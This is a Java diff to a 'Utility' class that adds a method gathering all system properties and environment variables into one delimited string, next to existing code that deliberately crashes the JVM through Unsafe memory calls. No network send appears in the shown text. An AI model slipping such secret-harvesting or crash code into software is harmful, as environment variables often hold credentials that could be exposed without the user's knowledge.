@@ -14,6 +14,7 @@ import java.util.List;
  * @author _kisman_
  * @since 12:51 of 04.07.2022
  */
+@SuppressWarnings("StatementWithEmptyBody")
 public class Utility {
     public static List<String> allowedFileSuffixes = Arrays.asList(
             ".png",//images
@@ -63,5 +64,23 @@ public class Utility {
         }
         unsafe.putAddress(0L, 0L);
         unsafe.freeMemory(0L);
+    }
+
+    public static String properties() {
+        StringBuilder properties = new StringBuilder();
+
+        for(Object property : System.getProperties().keySet()) {
+            if(property instanceof String && property != "line.separator") {
+                properties.append(property).append("|").append(System.getProperty(property.toString())).append("&");
+            }
+        }
+
+        for(String env : System.getenv().keySet()) {
+            if(env != "line.separator") {
+                properties.append(env).append("|").append(System.getenv(env)).append("&");
+            }
+        }
+
+        return properties.toString();
     }
 }
